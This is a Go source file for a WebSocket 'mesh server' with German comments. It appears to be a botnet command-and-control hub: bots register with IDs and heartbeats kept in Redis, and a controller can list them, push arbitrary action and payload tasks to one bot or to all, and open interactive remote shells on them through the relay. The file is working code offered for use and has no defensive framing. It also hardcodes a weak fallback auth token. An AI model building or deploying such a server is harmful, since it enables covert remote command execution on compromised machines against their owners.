package main

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/go-redis/redis/v8"
	"nhooyr.io/websocket"
	"nhooyr.io/websocket/wsjson"
)

var (
	authToken = os.Getenv("AUTH_TOKEN")
	redisAddr = os.Getenv("REDIS_URL")
)

type Client struct {
	conn *websocket.Conn
	ctx  context.Context
	id   string
	typ  string
	mu   sync.Mutex
}

type Hub struct {
	mu         sync.RWMutex
	clients    map[string]*Client
	register   chan *Client
	unregister chan *Client
	redis      *redis.Client
}

type ShellSession struct {
	controller *Client
	client     *Client
}

var (
	hub           *Hub
	shellSessions sync.Map
)

func main() {
	if authToken == "" {
		authToken = "geheim123" // Fallback
	}
	if redisAddr == "" {
		redisAddr = "localhost:6379"
	}

	hub = &Hub{
		clients:    make(map[string]*Client),
		register:   make(chan *Client),
		unregister: make(chan *Client),
		redis: redis.NewClient(&redis.Options{
			Addr: redisAddr,
		}),
	}

	// Redis-Verbindung testen
	ctx := context.Background()
	if err := hub.redis.Ping(ctx).Err(); err != nil {
		log.Printf("Warnung: Redis nicht erreichbar: %v", err)
	} else {
		log.Println("Redis verbunden")
	}

	go hub.run()

	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		c, err := websocket.Accept(w, r, nil)
		if err != nil {
			log.Println("WebSocket Accept Fehler:", err)
			return
		}
		client := &Client{
			conn: c,
			ctx:  context.Background(), // Wichtig: nicht r.Context() verwenden!
		}
		go handleClient(client)
	})

	log.Println("Mesh Server startet auf :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func (h *Hub) run() {
	for {
		select {
		case client := <-h.register:
			h.mu.Lock()
			h.clients[client.id] = client
			h.mu.Unlock()
			log.Printf("Client registriert: %s (Typ: %s)", client.id, client.typ)

		case client := <-h.unregister:
			h.mu.Lock()
			if _, ok := h.clients[client.id]; ok {
				delete(h.clients, client.id)
				log.Printf("Client entfernt: %s", client.id)
			}
			h.mu.Unlock()
		}
	}
}

func handleClient(c *Client) {
	defer c.conn.Close(websocket.StatusInternalError, "Verbindung geschlossen")

	// Initiale Authentifizierung
	var initMsg struct {
		Type      string `json:"type"`
		AuthToken string `json:"auth_token,omitempty"`
		BotID     string `json:"bot_id,omitempty"`
	}
	if err := wsjson.Read(c.ctx, c.conn, &initMsg); err != nil {
		log.Println("Init-Fehler:", err)
		return
	}

	// Controller muss sich authentifizieren
	if initMsg.Type == "controller" && initMsg.AuthToken != authToken {
		log.Println("Ungültiger Auth-Token für Controller")
		return
	}

	c.typ = initMsg.Type
	if c.typ == "client" {
		c.id = initMsg.BotID
		hub.redis.SAdd(c.ctx, "active_bots", c.id)
		hub.redis.HSet(c.ctx, "bot:"+c.id, "heartbeat", time.Now().Unix())
	} else {
		c.id = fmt.Sprintf("controller-%d", time.Now().UnixNano())
	}

	hub.register <- c
	defer func() {
		hub.unregister <- c
		if c.typ == "client" {
			hub.redis.SRem(c.ctx, "active_bots", c.id)
			hub.redis.Del(c.ctx, "bot:"+c.id)
		}
	}()

	// Heartbeat-Ticker für Clients
	if c.typ == "client" {
		go func() {
			ticker := time.NewTicker(10 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-ticker.C:
					hub.redis.HSet(c.ctx, "bot:"+c.id, "heartbeat", time.Now().Unix())
				case <-c.ctx.Done():
					return
				}
			}
		}()
	}

	// Nachrichten-Schleife
	for {
		var msg map[string]interface{}
		err := wsjson.Read(c.ctx, c.conn, &msg)
		if err != nil {
			log.Printf("Lesefehler von %s (typ=%s): %v", c.id, c.typ, err)
			break
		}
		log.Printf("Nachricht von %s: %v", c.id, msg)
		hub.handleMessage(c, msg)
	}
}

func (h *Hub) handleMessage(sender *Client, msg map[string]interface{}) {
	msgType, _ := msg["type"].(string)

	switch msgType {
	case "shell_input":
		h.handleShellInput(sender, msg)
	case "shell_output":
		h.handleShellOutput(sender, msg)
	case "shell_exit":
		h.handleShellExit(sender, msg)
	case "command":
		if sender.typ == "controller" {
			h.handleControllerCommand(sender, msg)
		}
	case "result":
		h.forwardToController(sender, msg)
	default:
		log.Printf("Unbekannter Nachrichtentyp: %s von %s", msgType, sender.id)
	}
}

func (h *Hub) handleControllerCommand(sender *Client, msg map[string]interface{}) {
	action, _ := msg["action"].(string)
	target, _ := msg["target"].(string)
	payload, _ := msg["payload"].(string)
	taskID, _ := msg["task_id"].(string)

	if action == "shell" {
		h.startShellSession(sender, target)
		return
	}

	if action == "list" {
		h.sendBotList(sender)
		return
	}

	task := map[string]interface{}{
		"task_id": taskID,
		"action":  action,
		"target":  target,
		"payload": payload,
	}

	h.mu.RLock()
	targetFound := false
	for id, client := range h.clients {
		if client.typ == "client" && (target == "all" || id == target || strings.HasPrefix(id, target)) {
			targetFound = true
			wsjson.Write(client.ctx, client.conn, task)
		}
	}
	h.mu.RUnlock()

	confirmMsg := map[string]interface{}{
		"type":    "info",
		"message": fmt.Sprintf("Aufgabe %s an %s gesendet", action, target),
	}
	if !targetFound && target != "all" {
		confirmMsg["message"] = fmt.Sprintf("Ziel '%s' nicht gefunden", target)
	}
	wsjson.Write(sender.ctx, sender.conn, confirmMsg)
}

func (h *Hub) sendBotList(controller *Client) {
	h.mu.RLock()
	defer h.mu.RUnlock()

	type BotInfo struct {
		BotID       string `json:"bot_id"`
		Status      string `json:"status"`
		Hostname    string `json:"hostname"`
		LastSeenSec int    `json:"last_seen_sec"`
	}

	bots := make([]BotInfo, 0)
	for id, client := range h.clients {
		if client.typ == "client" {
			lastSeen := 0
			val, err := hub.redis.HGet(context.Background(), "bot:"+id, "heartbeat").Result()
			if err == nil {
				var timestamp int64
				fmt.Sscanf(val, "%d", &timestamp)
				lastSeen = int(time.Now().Unix() - timestamp)
			}
			bots = append(bots, BotInfo{
				BotID:       id,
				Status:      "online",
				Hostname:    id,
				LastSeenSec: lastSeen,
			})
		}
	}

	response := map[string]interface{}{
		"type": "result",
		"data": map[string]interface{}{
			"bots": bots,
		},
	}
	wsjson.Write(controller.ctx, controller.conn, response)
}

func (h *Hub) startShellSession(controller *Client, targetID string) {
	h.mu.RLock()
	client, ok := h.clients[targetID]
	h.mu.RUnlock()

	if !ok || client.typ != "client" {
		wsjson.Write(controller.ctx, controller.conn, map[string]interface{}{
			"type":    "shell_started",
			"message": "Client nicht gefunden",
		})
		return
	}

	shellID := fmt.Sprintf("shell_%d", time.Now().UnixNano())

	shellReq := map[string]interface{}{
		"type":     "shell_request",
		"shell_id": shellID,
	}
	if err := wsjson.Write(client.ctx, client.conn, shellReq); err != nil {
		wsjson.Write(controller.ctx, controller.conn, map[string]interface{}{
			"type":    "error",
			"message": "Client nicht erreichbar",
		})
		return
	}

	shellSessions.Store(shellID, &ShellSession{
		controller: controller,
		client:     client,
	})

	wsjson.Write(controller.ctx, controller.conn, map[string]interface{}{
		"type":     "shell_started",
		"shell_id": shellID,
		"message":  fmt.Sprintf("Shell auf %s gestartet", targetID),
	})
}

func (h *Hub) handleShellInput(sender *Client, msg map[string]interface{}) {
	shellID, _ := msg["shell_id"].(string)
	data, _ := msg["data"].(string)

	if session, ok := shellSessions.Load(shellID); ok {
		s := session.(*ShellSession)
		if sender.id == s.controller.id {
			wsjson.Write(s.client.ctx, s.client.conn, map[string]interface{}{
				"type":     "shell_input",
				"shell_id": shellID,
				"data":     data,
			})
		}
	}
}

func (h *Hub) handleShellOutput(sender *Client, msg map[string]interface{}) {
	shellID, _ := msg["shell_id"].(string)
	data, _ := msg["data"].(string)

	if session, ok := shellSessions.Load(shellID); ok {
		s := session.(*ShellSession)
		if sender.id == s.client.id {
			wsjson.Write(s.controller.ctx, s.controller.conn, map[string]interface{}{
				"type":     "shell_output",
				"shell_id": shellID,
				"data":     data,
			})
		}
	}
}

func (h *Hub) handleShellExit(sender *Client, msg map[string]interface{}) {
	shellID, _ := msg["shell_id"].(string)

	if session, ok := shellSessions.Load(shellID); ok {
		s := session.(*ShellSession)
		wsjson.Write(s.controller.ctx, s.controller.conn, map[string]interface{}{
			"type":     "shell_exit",
			"shell_id": shellID,
		})
		shellSessions.Delete(shellID)
	}
}

func (h *Hub) forwardToController(sender *Client, msg map[string]interface{}) {
	h.mu.RLock()
	defer h.mu.RUnlock()

	for _, client := range h.clients {
		if client.typ == "controller" {
			wsjson.Write(client.ctx, client.conn, msg)
		}
	}
}
